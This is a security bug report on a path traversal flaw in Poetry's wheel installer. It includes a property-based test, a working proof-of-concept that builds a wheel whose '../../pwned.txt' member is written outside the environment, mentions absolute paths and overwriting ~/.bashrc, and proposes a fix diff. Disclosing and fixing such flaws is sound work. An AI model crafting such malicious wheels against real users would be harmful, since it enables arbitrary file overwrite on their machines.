# Bug Report: poetry.installation.wheel_installer Path traversal writes files outside the environment

**Target**: `poetry.installation.wheel_installer.WheelDestination.write_to_fs` (via `WheelInstaller.install`)
**Severity**: High
**Bug Type**: Logic (security)
**Date**: 2026-10-06

## Summary

`WheelDestination.write_to_fs` builds the target path as `Path(self.scheme_dict[scheme]) / path` and writes to it without checking that it stays inside the scheme directory. A wheel whose RECORD lists a member such as `../../pwned.txt` or an absolute path (e.g. `/tmp/x`) gets that file written anywhere the user can write. This is a path traversal / arbitrary file write during `poetry install`.

## Property-Based Test

```python
seg = st.one_of(st.just(".."), st.from_regex(r"[a-z]{1,6}", fullmatch=True))
member_path = st.lists(seg, min_size=1, max_size=5).map("/".join).filter(
    lambda p: not p.endswith("..") and not p.startswith("demo-1.0")
)

@settings(max_examples=200, deadline=None, suppress_health_check=list(HealthCheck))
@given(st.lists(member_path, min_size=1, max_size=4, unique=True))
def test_installed_files_stay_in_root(paths):
    with tempfile.TemporaryDirectory() as tmp:
        tmp = Path(tmp).resolve()
        root = tmp / "env"
        root.mkdir()
        whl = build_wheel(tmp, [(p, b"x") for p in paths])
        try:
            WheelInstaller(FakeEnv(root)).install(whl)
        except (OSError, Exception) as e:
            if isinstance(e, AssertionError):
                raise
        for dirpath, _, fnames in os.walk(tmp):
            for f in fnames:
                full = Path(dirpath, f).resolve()
                if full == whl:
                    continue
                assert full.is_relative_to(root), f"file escaped env root: {full}"
```

(The full test, including the `FakeEnv` and `build_wheel` helpers, is in `test_wheel_installer.py`.)

**Failing input**: `paths=['../../a']`

## Reproducing the Bug

```python
import base64, hashlib, tempfile, zipfile
from pathlib import Path
from poetry.installation.wheel_installer import WheelInstaller

def rec(p, d):
    h = base64.urlsafe_b64encode(hashlib.sha256(d).digest()).rstrip(b"=").decode()
    return f"{p},sha256={h},{len(d)}"

tmp = Path(tempfile.mkdtemp()).resolve()
root = tmp / "env"
files = {
    "../../pwned.txt": b"owned",
    "demo-1.0.dist-info/METADATA": b"Metadata-Version: 2.1\nName: demo\nVersion: 1.0\n",
    "demo-1.0.dist-info/WHEEL": b"Wheel-Version: 1.0\nRoot-Is-Purelib: true\nTag: py3-none-any\n",
}
whl = tmp / "demo-1.0-py3-none-any.whl"
with zipfile.ZipFile(whl, "w") as z:
    for p, d in files.items():
        z.writestr(p, d)
    z.writestr("demo-1.0.dist-info/RECORD",
               "\n".join(rec(p, d) for p, d in files.items()) + "\ndemo-1.0.dist-info/RECORD,,\n")

class Env:
    python = root / "bin/python"
    scheme_dict = {k: str(root / k) for k in ("purelib", "platlib", "scripts", "data", "include")}

WheelInstaller(Env()).install(whl)
print((tmp / "pwned.txt").exists())  # True: written outside env root
```

Output: `True owned`. Replacing the member name with an absolute path also writes to that absolute location, because `Path(a) / "/abs"` evaluates to `/abs`.

## Why This Is A Bug

`write_to_fs` is meant to write "path within that scheme" (from the base class docstring). Wheel paths must be relative paths inside the archive root. Installing an untrusted package should never write files outside the target environment. Here, a malicious wheel from any index can overwrite files such as `~/.bashrc` or shell startup files just by being installed. `install()` passes paths from the RECORD to the destination unchanged, and poetry's override is the last place that could check them.

## Fix

```diff
--- a/src/poetry/installation/wheel_installer.py
+++ b/src/poetry/installation/wheel_installer.py
@@ class WheelDestination(SchemeDictionaryDestination):
-        target_path = Path(self.scheme_dict[scheme]) / path
+        scheme_path = Path(self.scheme_dict[scheme]).resolve()
+        target_path = (scheme_path / path).resolve()
+        if not target_path.is_relative_to(scheme_path):
+            raise ValueError(
+                f"Attempting to write {path} outside of the target directory"
+            )
         if target_path.exists():
```
